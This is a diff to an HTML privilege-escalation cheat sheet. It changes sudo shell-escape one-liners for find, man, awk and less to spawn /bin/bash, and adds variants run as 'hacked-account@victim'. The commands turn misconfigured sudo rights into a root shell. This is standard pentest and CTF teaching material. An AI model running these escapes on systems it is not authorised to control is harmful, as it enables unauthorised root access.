@@ -207,7 +207,9 @@ Heres a lists of a few programs that can be used to privesc, for more check the 
 
 <h2>find</h2>
 
-<b>hacked-account@victim~: </b><code>sudo find . -exec /bin/sh \; -quit</code>
+<b>hacked-account@victim~: </b><code>sudo find . -exec /bin/bash \; -quit</code>
+
+<b>hacked-account@victim~: </b><code>sudo find /var/log -name messages -exec /bin/bash -i \;</code>
 
 <h2>nano</h2>
 
@@ -215,17 +217,20 @@ Heres a lists of a few programs that can be used to privesc, for more check the 
 
 <h2>man</h2>
 
-<b>hacked-account@victim~: </b><code>sudo man man </code>followed by <code>!/bin/sh</code>
+<b>hacked-account@victim~: </b><code>sudo man man </code>followed by <code>!/bin/bash</code>
 
 <h2>awk</h2>
 
-<b>hacked-account@victim~: </b><code>sudo awk 'BEGIN {system("/bin/sh")}'</code>
+<b>hacked-account@victim~: </b><code>sudo awk 'BEGIN {system("/bin/bash")}'</code>
 
 <h2>less</h2>
 
-<b>hacked-account@victim~: </b><code>sudo less /etc/profile followed by !/bin/sh</code>
+<b>hacked-account@victim~: </b><code>sudo less /etc/profile followed by !/bin/bash</code>
+
+<b>hacked-account@victim~: </b><code>sudo less /var/log/messages followed by !/bin/bash</code>
 
 <b>hacked-account@victim~: </b><code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the progrom persist the root permision)
+
 
 <h2>ftp</h2>
 
